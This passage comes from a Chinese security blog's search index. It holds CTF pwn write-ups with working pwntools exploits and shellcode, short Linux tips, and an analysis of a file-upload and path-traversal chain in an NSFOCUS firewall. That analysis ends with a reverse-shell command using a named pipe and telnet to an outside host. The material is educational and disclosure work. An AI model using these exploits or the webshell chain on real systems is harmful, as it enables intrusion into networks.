rsp运行到栈，再指向shellcode。\n然后我们通过IDA查看一下padding大小和一些细节：\n通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。\n方法一： 我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。\n栈的结构为：\n#stackprivot_x64\rfrom pwn import *\r#p = process(\u0026#39;./stackprivot\u0026#39;)\rp = remote(\u0026#34;10.0.25.109\u0026#34;, 10002)\rshellcode = \u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34;\rif args.G:\rgdb.attach(p)\rsub_rsp_jmp = asm(\u0026#34;sub rsp, 0x40;jmp rsp\u0026#34;,arch = \u0026#39;amd64\u0026#39; )\rjmp_rsp = 0x40068b\rpayload = flat([shellcode.ljust(0x30, \u0026#34;A\u0026#34;), b\u0026#39;b\u0026#39;*8 , p64(jmp_rsp), sub_rsp_jmp])\rp.recvuntil(\u0026#34;?\u0026#34;)\rp.sendline(payload)\rp.interactive() 方法二： 我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。\n栈的结构为：\n#stackprivot_x64\rfrom pwn import *\r#p = process(\u0026#39;./stackprivot\u0026#39;)\rp = remote(\u0026#34;10.0.25.109\u0026#34;, 10002)\rshellcode = \u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34;\rif args.G:\rgdb.attach(p)\rjmp_rsp = 0x40068b\rpayload = flat([b\u0026#39;a\u0026#39;*0x38,p64(jmp_rsp),shellcode])\rp.recvuntil(\u0026#34;?\u0026#34;)\rp.sendline(payload)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/stackprivot/","summary":"注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。 查看基本信息：\n这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：\n有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp rsp运行到栈，再指向shellcode。\n然后我们通过IDA查看一下padding大小和一些细节：\n通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。\n方法一： 我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。\n栈的结构为：\n#stackprivot_x64\rfrom pwn import *\r#p = process(\u0026#39;./stackprivot\u0026#39;)\rp = remote(\u0026#34;10.0.25.109\u0026#34;, 10002)\rshellcode = \u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34;\rif args.G:\rgdb.attach(p)\rsub_rsp_jmp = asm(\u0026#34;sub rsp, 0x40;jmp rsp\u0026#34;,arch = \u0026#39;amd64\u0026#39; )\rjmp_rsp = 0x40068b\rpayload = flat([shellcode.ljust(0x30, \u0026#34;A\u0026#34;), b\u0026#39;b\u0026#39;*8 , p64(jmp_rsp), sub_rsp_jmp])\rp.recvuntil(\u0026#34;?\u0026#34;)\rp.sendline(payload)\rp.interactive() 方法二： 我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。\n栈的结构为：\n#stackprivot_x64\rfrom pwn import *\r#p = process(\u0026#39;./stackprivot\u0026#39;)\rp = remote(\u0026#34;10.0.25.109\u0026#34;, 10002)\rshellcode = \u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34;\rif args.","title":"stackprivot"},{"content":"注：这道题需要在Ubuntu16.04的环境上运行。 首先使用checksec查看程序的基本情况：\n可以看到这个，程序开启了canary（栈保护）。\n当程序开启了banary后，当程序检测到溢出后会调用stack_chk_fail函数，这个函数就会输出报错信息：\n可以看到，报错的信息是：字符串+程序名字+terminated\n*** stack smashing detected ***: ./stacksmashes_old terminated 这里我们需要将程序放入IDA查看一下程序存储的字符串：\n在字符串中我们可以看到，程序中是没有放入文件名字，那么我们可以猜测，报错信息中的文件名，是在程序的主函数加载之前就被载入栈中的。\n通过stack_chk_fail函数的源码，我们就可以看出漏洞：\nvoid __attribute__ ((noreturn)) __stack_chk_fail (void)\r{\r__fortify_fail (\u0026#34;stack smashing detected\u0026#34;);\r}\rvoid __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)\r{\r/* The loop is added only to keep gcc happy. */\rwhile (1)\r__libc_message (2, \u0026#34;*** %s ***: %s terminated\\n\u0026#34;,\rmsg, __libc_argv[0] ?: \u0026#34;\u0026lt;unknown\u0026gt;\u0026#34;); } 在下面__libc_argv[0]这个指针所指的就是我们程序的名字，那么通过这个指针的偏移量，我们就可以打印出任意我们知道地址的字符串。\n而这个漏洞在之后的更新中已经修复，故需要在ubuntu16.04上使用。\n新版libc中__stack_chk_fail函数代码：\nvoid\r__attribute__ ((noreturn))\r__stack_chk_fail (void)\r{\r__fortify_fail_abort (false, \u0026#34;stack smashing detected\u0026#34;);\r}\rvoid\r__attribute__ ((noreturn))\r__fortify_fail_abort (_Bool need_backtrace, const char *msg)\r{\r/* The loop is added only to keep gcc happy. Don\u0026#39;t pass down\r__libc_argv[0] if we aren\u0026#39;t doing backtrace since __libc_argv[0]\rmay point to the corrupted stack. */\rwhile (1)\r__libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,\r\u0026#34;*** %s ***: %s terminated\\n\u0026#34;,\rmsg,\r(need_backtrace \u0026amp;\u0026amp; __libc_argv[0] != NULL\r? __libc_argv[0] : \u0026#34;\u0026lt;unknown\u0026gt;\u0026#34;));\r} 现在我们正式做这道题，通过IDA我们可以看到程序的字符串中有一个flag：\n而这道题和其他的取得shell的题目不一样，这道题的目标是将程序中的flag输出出来。\n然后我们查看有溢出点的代码：\n可以看到这里有一个gets函数的溢出点，那么接下来找到flag地址：\n找到flag后我们需要找到偏移量：\n我们到gdb中，设置断点到call gets（0x400805）处：\n然后随便输入字符串后查看栈：\n随后计算偏移：\n我们的payload就为：\npayload=b\u0026#39;a\u0026#39;*0x218+p64(0x600d80) 但是当我们用这个这个payload，我们会发现输出的并不是完整的flag：\n出现这种情况的原因在代码中：\n因为接下来的代码导致我们输入的字符会将flag覆盖掉。\n这个时候就需要利用一个技巧：在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出\n在调试的时候可以看到smashes被映射到两处地址中，所以只要在二进制文件0x000000000 ~ 0x00001000范围内的内容都会被映射到内存中，分别以0x600000和0x400000作为起始地址。flag在0x00000d80，所以会在内存中出现两次，分别位于0x00600d80和0x00400d80。所以虽然0x00600d80的位置虽然被覆盖了，但是依然可以在0x00400d80的位置找到flag\npayload=b\u0026#39;a\u0026#39;*0x218+p64(0x400d80) #stacksmashes\rfrom pwn import *\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10003)\r#p=process(\u0026#39;./stacksmashes\u0026#39;)\rpayload=b\u0026#39;a\u0026#39;*0x218+p64(0x400d80)\rp.sendlineafter(\u0026#39;name:\u0026#39;,payload)\rp.sendlineafter(\u0026#39;flag:\u0026#39;,\u0026#39;\u0026#39;)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/stacksmashes/","summary":"注：这道题需要在Ubuntu16.04的环境上运行。 首先使用checksec查看程序的基本情况：\n可以看到这个，程序开启了canary（栈保护）。\n当程序开启了banary后，当程序检测到溢出后会调用stack_chk_fail函数，这个函数就会输出报错信息：\n可以看到，报错的信息是：字符串+程序名字+terminated\n*** stack smashing detected ***: ./stacksmashes_old terminated 这里我们需要将程序放入IDA查看一下程序存储的字符串：\n在字符串中我们可以看到，程序中是没有放入文件名字，那么我们可以猜测，报错信息中的文件名，是在程序的主函数加载之前就被载入栈中的。\n通过stack_chk_fail函数的源码，我们就可以看出漏洞：\nvoid __attribute__ ((noreturn)) __stack_chk_fail (void)\r{\r__fortify_fail (\u0026#34;stack smashing detected\u0026#34;);\r}\rvoid __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)\r{\r/* The loop is added only to keep gcc happy. */\rwhile (1)\r__libc_message (2, \u0026#34;*** %s ***: %s terminated\\n\u0026#34;,\rmsg, __libc_argv[0] ?: \u0026#34;\u0026lt;unknown\u0026gt;\u0026#34;); } 在下面__libc_argv[0]这个指针所指的就是我们程序的名字，那么通过这个指针的偏移量，我们就可以打印出任意我们知道地址的字符串。\n而这个漏洞在之后的更新中已经修复，故需要在ubuntu16.04上使用。\n新版libc中__stack_chk_fail函数代码：\nvoid\r__attribute__ ((noreturn))\r__stack_chk_fail (void)\r{\r__fortify_fail_abort (false, \u0026#34;stack smashing detected\u0026#34;);\r}\rvoid\r__attribute__ ((noreturn))\r__fortify_fail_abort (_Bool need_backtrace, const char *msg)\r{\r/* The loop is added only to keep gcc happy.","title":"stacksmashes"},{"content":"在windows上可以使用burpsuite进行抓包。但burpsuite在linux上不便于安装。\n在linux上我们可以使用tcpdump命令。\n具体安装流程我们略过，如要安装可以直接百度。\n通过host参数进行IP地址过滤：\ntcpdump -n host 192.168.110.129 -n表示不把ip解析成域名\nscr可以筛选来源地址：\ntcpdump scr 192.168.110.129 dst可以筛选目的地址：\ntcpdump dst 192.168.110.129 port指定端口\ntcpdump port 8080 若要指定协议，则直接输入就好了：\ntcpdump tcp\r或者\rtcpdump icmp ","permalink":"https://jellyfish-pro.github.io/note/tcpdump%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/","summary":"在windows上可以使用burpsuite进行抓包。但burpsuite在linux上不便于安装。\n在linux上我们可以使用tcpdump命令。\n具体安装流程我们略过，如要安装可以直接百度。\n通过host参数进行IP地址过滤：\ntcpdump -n host 192.168.110.129 -n表示不把ip解析成域名\nscr可以筛选来源地址：\ntcpdump scr 192.168.110.129 dst可以筛选目的地址：\ntcpdump dst 192.168.110.129 port指定端口\ntcpdump port 8080 若要指定协议，则直接输入就好了：\ntcpdump tcp\r或者\rtcpdump icmp ","title":"tcpdump快速使用"},{"content":"Ubuntu20及以上版本，虽会自带python2，但python2中不会自带pip和setuptools这两个模块。\n同时使用Ubuntu20及以上版已经将python-pip移除apt库。\n故，我们不能使用tar.gz安装pip和apt安装pip。\n这时我们可以去pipy下载对应python2的pip源码：\nwget https://bootstrap.pypa.io/pip/2.7/get-pip.py -O get-pip.py\rpython get-pip.py ","permalink":"https://jellyfish-pro.github.io/note/ubuntu20-%E6%97%A0setuptools%E4%B8%8B%E5%AE%89%E8%A3%85pip/","summary":"Ubuntu20及以上版本，虽会自带python2，但python2中不会自带pip和setuptools这两个模块。\n同时使用Ubuntu20及以上版已经将python-pip移除apt库。\n故，我们不能使用tar.gz安装pip和apt安装pip。\n这时我们可以去pipy下载对应python2的pip源码：\nwget https://bootstrap.pypa.io/pip/2.7/get-pip.py -O get-pip.py\rpython get-pip.py ","title":"ubuntu20 无setuptools下安装pip"},{"content":"此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)\n首先查看一下保护：\n可以发现这居然是一个32位程序，并且没有开启pie\n随后运行一下程序：\n可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。\n随后我们来到ida查看这些功能的细节：\n在查看添加函数时，我们发现存在一个名为v0的结构体：\n通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。\n**注意：**这里的content也是通过malloc函数分配的空间。\n随后我们看到删除函数：\n可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件\n结合刚刚程序的流程，我们可以得出一条利用方式：\n首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块\n**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。\n当我们创建两个note后，我们需要将这两个note给删除。\n这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：\n但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。\n这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。\n那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。\n最后数据就会变为这样：\n可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。\n如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。\n同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。\n#!/usr/bin/python3\r#Use_After_free_exp.py\r#lab 10 hacknote\rfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = process(\u0026#39;./hacknote\u0026#39;)\rmagic = 0x08048986\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;Note size :\u0026#39;)\rp.send(\u0026#39;16\u0026#39;)\rp.recvuntil(\u0026#39;Content :\u0026#39;)\rp.send(\u0026#39;aaaa\u0026#39;)\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;Note size :\u0026#39;)\rp.send(\u0026#39;16\u0026#39;)\rp.recvuntil(\u0026#39;Content :\u0026#39;)\rp.send(\u0026#39;bbbb\u0026#39;)\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;2\u0026#39;)\rp.recvuntil(\u0026#39;Index :\u0026#39;)\rp.send(\u0026#39;0\u0026#39;)\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;2\u0026#39;)\rp.recvuntil(\u0026#39;Index :\u0026#39;)\rp.send(\u0026#39;1\u0026#39;)\r# gdb.attach(p)\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;1\u0026#39;)\r# pause()\rp.recvuntil(\u0026#39;Note size :\u0026#39;)\rp.send(\u0026#39;8\u0026#39;)\rp.recvuntil(\u0026#39;Content :\u0026#39;)\rp.send(p32(magic))\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;3\u0026#39;)\rp.recvuntil(\u0026#39;Index :\u0026#39;)\rp.send(\u0026#39;0\u0026#39;)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/use_after_free/","summary":"此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)\n首先查看一下保护：\n可以发现这居然是一个32位程序，并且没有开启pie\n随后运行一下程序：\n可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。\n随后我们来到ida查看这些功能的细节：\n在查看添加函数时，我们发现存在一个名为v0的结构体：\n通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。\n**注意：**这里的content也是通过malloc函数分配的空间。\n随后我们看到删除函数：\n可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件\n结合刚刚程序的流程，我们可以得出一条利用方式：\n首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块\n**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。\n当我们创建两个note后，我们需要将这两个note给删除。\n这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：\n但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。\n这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。\n那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。\n最后数据就会变为这样：\n可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。\n如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。\n同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。\n#!/usr/bin/python3\r#Use_After_free_exp.py\r#lab 10 hacknote\rfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = process(\u0026#39;./hacknote\u0026#39;)\rmagic = 0x08048986\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;Note size :\u0026#39;)\rp.send(\u0026#39;16\u0026#39;)\rp.recvuntil(\u0026#39;Content :\u0026#39;)\rp.send(\u0026#39;aaaa\u0026#39;)\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;Note size :\u0026#39;)\rp.send(\u0026#39;16\u0026#39;)\rp.recvuntil(\u0026#39;Content :\u0026#39;)\rp.send(\u0026#39;bbbb\u0026#39;)\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.","title":"Use_After_Free"},{"content":"mount -o remount,rw / 使用mount命令重新挂载根目录，给一个可读可写的权限\n","permalink":"https://jellyfish-pro.github.io/note/%E6%8A%A5%E9%94%99read-only-file-system%E7%BB%93%E5%B1%80%E6%96%B9%E6%B3%95/","summary":"mount -o remount,rw / 使用mount命令重新挂载根目录，给一个可读可写的权限","title":"报错read-only file system解决方法"},{"content":"绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞 漏洞介绍 测试环境时在绿盟NG3 G2000L防火墙上进行的，固件版本：V6.0.1.58；引擎版本：V6.0.3.134。\n根据网络上就传的poc信息，该漏洞组合可能广泛存在于绿盟的整个NG系列防火墙上。不过因为防火墙和固件版本不一样，导致最终的发包内容有所区别。\n文件上传漏洞：该漏洞是因为开发时并没有考虑到特殊情况，从而产生漏洞 路径穿越漏洞：该漏洞是因为文件上传漏洞造成的次生漏洞，因为攻击者上传了特殊文件，从而导致攻击者可以控制本不能控制的参数，从而造成路径穿越。 环境复现 对绿盟防火墙环境的复现可以既简单又困难 矛盾文学（雾）\n困难的地方在于，在网络上找不到绿盟防火墙的完整固件。在其官网中也只能找到升级包，而并非完整的固件包。\n但如果能够直接购买到设备，那就会变得特别的简单。\n无法获得底层shell 当然拿到设备后，可以发现该设备有很多账户，但是只有develop账户可以进入最底层的Linux。可这个账户的密码，是根据一套算法实时计算的，只有寻找绿盟客服才能获得密码。\n所以我们只能采取其他方法。\n漏洞分析 文件上传漏洞 这里我们首先使用bp模拟发包：\n这里首先上传了一个名sess_82c13f359d0dd8f51c29d658a9c8ac71的文件，其实通过这个文件名称，我们就可以大概猜到其作用：想要保存一个session对话。\n一般sess打头的文件都是放在*/tmp*目录下，但以防万一，我们还是在代码中找了一下：\n./nsfocus/web/rest4espc/ipsv1/dispatch/v1/device/bugsInfo/resourse.php 通过代码，可以发现上传路径就是*/tmp*。\n同时，在这个文件中还可以看到一个身份判断：\n这里将$token和$contents进行比较，$contents来自*/tmp/token*文件，而$token来自我们GET传输的数据。\n那么我们如何绕过这个验证呢？答案是什么都不做。\n因为如果我们访问的sess文件中没有$contents的值，则php就会将$contents置为空。同时如果我们发包时，不使用GET传递参数，那么php会将$token也置为空。两个值都置空了，那两个值不就相等了？PHP 是最好的语言\n路径穿越漏洞 通过bp的包，我们可以看到，这时的session_id是最开始我们上传的文件名\n那么这个包，是怎么导致路径穿越的呢？根据上面这个包访问的路径：\n./nsfocus/web/apache2/sslvpn/mail/include/header_main.php 可以看到这里包含了一个叫做compose.php的文件，文件本来的意思是读取session中\u0026quot;lang\u0026quot;的值，并将这个值拼接成一个路径。\n但是我们在伪造的sess文件中存入了特殊的\u0026quot;lang\u0026quot;的值：\nlang|s:52:\u0026#34;../../../../../../../../../../../../../../../../tmp/\u0026#34; 为了直观显示被修改后的效果，这里我修改了原文件，使其输出$lang：\n通过这样的方法，我们就控制了$lang的值，从而让PHP文件包含了我们指定文件夹下的compose.php文件\n漏洞利用 通过上面的漏洞分析，我们可以将利用链总结如下：\n上传一个伪造session，使第二个漏洞包含*/tmp下的compose.php*文件。 然后再上传一个含有一句话马的名字为compose.php的文件到*/tmp*下 最后访问header_main.php，触发路径穿越，导致包含到*/tmp下刚刚上传的compose.php*文件。 最后exp 上传第一个包：\n上传第二个包：\n最后触发路径穿越：\n./test2.py 192.168.1.1 \u0026#34;rm /tmp/f; mknod /tmp/f p; /bin/telnet 192.168.1.3 8080 \u0026lt; /tmp/f | /bin/bash \u0026gt;/tmp/f 2\u0026gt;/tmp/f\u0026#34; ","permalink":"https://jellyfish-pro.github.io/posts/lvmeng_ng3_g2000l_firewall_upload_pathtraversal/","summary":"绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞 漏洞介绍 测试环境时在绿盟NG3 G2000L防火墙上进行的，固件版本：V6.0.1.58；引擎版本：V6.0.3.134。\n根据网络上就传的poc信息，该漏洞组合可能广泛存在于绿盟的整个NG系列防火墙上。不过因为防火墙和固件版本不一样，导致最终的发包内容有所区别。\n文件上传漏洞：该漏洞是因为开发时并没有考虑到特殊情况，从而产生漏洞 路径穿越漏洞：该漏洞是因为文件上传漏洞造成的次生漏洞，因为攻击者上传了特殊文件，从而导致攻击者可以控制本不能控制的参数，从而造成路径穿越。 环境复现 对绿盟防火墙环境的复现可以既简单又困难 矛盾文学（雾）\n困难的地方在于，在网络上找不到绿盟防火墙的完整固件。在其官网中也只能找到升级包，而并非完整的固件包。\n但如果能够直接购买到设备，那就会变得特别的简单。\n无法获得底层shell 当然拿到设备后，可以发现该设备有很多账户，但是只有develop账户可以进入最底层的Linux。可这个账户的密码，是根据一套算法实时计算的，只有寻找绿盟客服才能获得密码。\n所以我们只能采取其他方法。\n漏洞分析 文件上传漏洞 这里我们首先使用bp模拟发包：\n这里首先上传了一个名sess_82c13f359d0dd8f51c29d658a9c8ac71的文件，其实通过这个文件名称，我们就可以大概猜到其作用：想要保存一个session对话。\n一般sess打头的文件都是放在*/tmp*目录下，但以防万一，我们还是在代码中找了一下：\n./nsfocus/web/rest4espc/ipsv1/dispatch/v1/device/bugsInfo/resourse.php 通过代码，可以发现上传路径就是*/tmp*。\n同时，在这个文件中还可以看到一个身份判断：\n这里将$token和$contents进行比较，$contents来自*/tmp/token*文件，而$token来自我们GET传输的数据。\n那么我们如何绕过这个验证呢？答案是什么都不做。\n因为如果我们访问的sess文件中没有$contents的值，则php就会将$contents置为空。同时如果我们发包时，不使用GET传递参数，那么php会将$token也置为空。两个值都置空了，那两个值不就相等了？PHP 是最好的语言\n路径穿越漏洞 通过bp的包，我们可以看到，这时的session_id是最开始我们上传的文件名\n那么这个包，是怎么导致路径穿越的呢？根据上面这个包访问的路径：\n./nsfocus/web/apache2/sslvpn/mail/include/header_main.php 可以看到这里包含了一个叫做compose.php的文件，文件本来的意思是读取session中\u0026quot;lang\u0026quot;的值，并将这个值拼接成一个路径。\n但是我们在伪造的sess文件中存入了特殊的\u0026quot;lang\u0026quot;的值：\nlang|s:52:\u0026#34;../../../../../../../../../../../../../../../../tmp/\u0026#34; 为了直观显示被修改后的效果，这里我修改了原文件，使其输出$lang：\n通过这样的方法，我们就控制了$lang的值，从而让PHP文件包含了我们指定文件夹下的compose.php文件\n漏洞利用 通过上面的漏洞分析，我们可以将利用链总结如下：\n上传一个伪造session，使第二个漏洞包含*/tmp下的compose.php*文件。 然后再上传一个含有一句话马的名字为compose.php的文件到*/tmp*下 最后访问header_main.php，触发路径穿越，导致包含到*/tmp下刚刚上传的compose.php*文件。 最后exp 上传第一个包：\n上传第二个包：\n最后触发路径穿越：\n./test2.py 192.168.1.1 \u0026#34;rm /tmp/f; mknod /tmp/f p; /bin/telnet 192.168.1.3 8080 \u0026lt; /tmp/f | /bin/bash \u0026gt;/tmp/f 2\u0026gt;/tmp/f\u0026#34; ","title":"绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞"}]